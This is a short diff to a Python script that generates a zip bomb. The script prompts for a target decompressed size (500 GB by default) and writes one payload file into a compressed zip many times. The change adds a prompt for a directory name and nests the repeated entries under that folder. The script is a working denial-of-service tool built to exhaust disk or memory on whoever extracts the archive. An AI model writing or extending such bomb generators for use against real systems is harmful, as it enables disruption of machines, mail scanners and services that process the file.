@@ -29,6 +29,7 @@ def get_bytes(amount_str):
 target_input = input("Bomb decompressed size: ") or "500 GB"
 payload_input = input("Payload file size: ") or "1 MB"
 zip_name = input("Output zip name: ") or "bomb.zip"
+folder_name = input("Bomb directory name: ") or "bomb-dir"
 
 PAYLOAD_NAME = "payload.txt"
 DECOMPRESSED_TOTAL = get_bytes(target_input)
@@ -45,7 +46,7 @@ with open(PAYLOAD_NAME, "wb") as f:
 
 with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
     for i in range(REPEATS):
-        arcname = f"{i}.txt"
+        arcname = f"{folder_name}/{i}.txt"
         zf.write(PAYLOAD_NAME, arcname)
         progress_bar(i + 1, REPEATS)
 
